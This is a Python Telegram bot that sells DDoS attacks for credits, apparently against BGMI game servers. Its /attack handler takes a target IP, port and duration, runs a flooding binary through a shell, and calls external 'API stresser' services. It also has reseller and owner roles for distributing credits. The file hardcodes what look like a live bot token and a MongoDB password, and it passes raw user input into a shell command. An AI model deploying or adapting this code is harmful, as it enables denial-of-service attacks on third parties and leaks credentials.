import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins 
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Global Variables
attack_in_progress = False
attack_end_time = 0
attack_lock = Lock()
DEFAULT_THREADS = 6

# --- PERMISSION HELPERS ---

def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN:
        return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    if admin_data:
        return admin_data.get("role")
    return "user"

def is_owner(user_id):
    return get_user_role(user_id) == "owner"

def is_reseller(user_id):
    role = get_user_role(user_id)
    return role == "reseller" or role == "owner"

# --- KEYBOARD ---
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- HELP COMMAND ---
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    role = get_user_role(user_id)
    
    help_text = "🌟 *Ultimate Command Center* 🌟\n\n"
    
    # User Commands
    help_text += "*👤 User Commands:*\n"
    help_text += "• `/attack` - Launch attack (Costs 5 Credits)\n"
    help_text += "• `/myinfo` - Check your credits & role\n"
    help_text += "• `/start` - Show welcome message\n\n"
    
    # Reseller Commands
    if is_reseller(user_id):
        help_text += "*🤝 Reseller Commands:*\n"
        help_text += "• `/addcredits <ID> <Amount>` - Give credits\n"
        help_text += "• `/listapi` - See active API links\n\n"
    
    # Owner Commands
    if is_owner(user_id):
        help_text += "*👑 Owner Commands:*\n"
        help_text += "• `/addowner <ID>` - Make someone Owner\n"
        help_text += "• `/addreseller <ID>` - Make someone Reseller\n"
        help_text += "• `/apiurl <URL> <Key>` - Configure API stresser\n"
        help_text += "• `/delapi <URL>` - Remove an API\n"

    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())

# --- OTHER COMMANDS ---

@bot.message_handler(commands=['addowner'])
def add_owner_command(message):
    if message.from_user.id != PRIMARY_ADMIN: return
    try:
        target_id = int(message.text.split()[1])
        admins_collection.update_one({"user_id": target_id}, {"$set": {"role": "owner"}}, upsert=True)
        bot.send_message(message.chat.id, f"👑 *New Owner Added:* `{target_id}`", parse_mode='Markdown')
    except: pass

@bot.message_handler(commands=['addreseller'])
def add_reseller_command(message):
    if not is_owner(message.from_user.id): return
    try:
        target_id = int(message.text.split()[1])
        admins_collection.update_one({"user_id": target_id}, {"$set": {"role": "reseller"}}, upsert=True)
        bot.send_message(message.chat.id, f"🤝 *New Reseller Added:* `{target_id}`", parse_mode='Markdown')
    except: pass

@bot.message_handler(commands=['addcredits'])
def add_credits_command(message):
    if not is_reseller(message.from_user.id): return
    try:
        args = message.text.split()
        target_id, amount = int(args[1]), int(args[2])
        users_collection.update_one({"user_id": target_id}, {"$inc": {"credits": amount}}, upsert=True)
        bot.send_message(message.chat.id, f"✅ *Credits Sent to* `{target_id}`", parse_mode='Markdown')
    except: pass

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    role = get_user_role(user_id)
    credits = user_data.get('credits', 0) if user_data else 0
    bot.send_message(message.chat.id, f"👤 *ID:* `{user_id}`\n🎭 *Role:* `{role.upper()}`\n💳 *Credits:* `{credits}`", parse_mode='Markdown')

# --- ATTACK ENGINE ---

async def run_instant_attack(chat_id, target_ip, target_port, duration):
    global attack_in_progress
    binary_cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {target_ip} {target_port} {duration} {DEFAULT_THREADS}"
    
    for api in list(api_collection.find()):
        try:
            requests.get(f"https://{api['url']}/api?key={api['key']}&host={target_ip}&port={target_port}&time={duration}", timeout=4)
        except: pass

    try:
        process = subprocess.Popen(binary_cmd, shell=True)
        await asyncio.sleep(duration)
        process.terminate()
        with attack_lock: attack_in_progress = False
        bot.send_message(chat_id, "*✅ Attack Finished!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    except:
        with attack_lock: attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*")
        return
    with attack_lock:
        if attack_in_progress:
            bot.send_message(message.chat.id, "⚠️ *Bot Busy!*")
            return
    bot.send_message(message.chat.id, "💣 *IP PORT TIME*")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        args = message.text.split()
        ip, port, dur = args[0], int(args[1]), int(args[2])
        users_collection.update_one({"user_id": message.from_user.id}, {"$inc": {"credits": -5}})
        global attack_in_progress, attack_end_time
        with attack_lock:
            attack_in_progress = True
            attack_end_time = time.time() + dur
        bot.send_message(message.chat.id, f"🚀 *Launched!* (-5 Credits)\n🎯 `{ip}:{port}`", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_instant_attack(message.chat.id, ip, port, dur), attack_loop)
    except: pass

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🌍 *Bot is Online! Use /help to see commands.*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# --- RUNNER ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
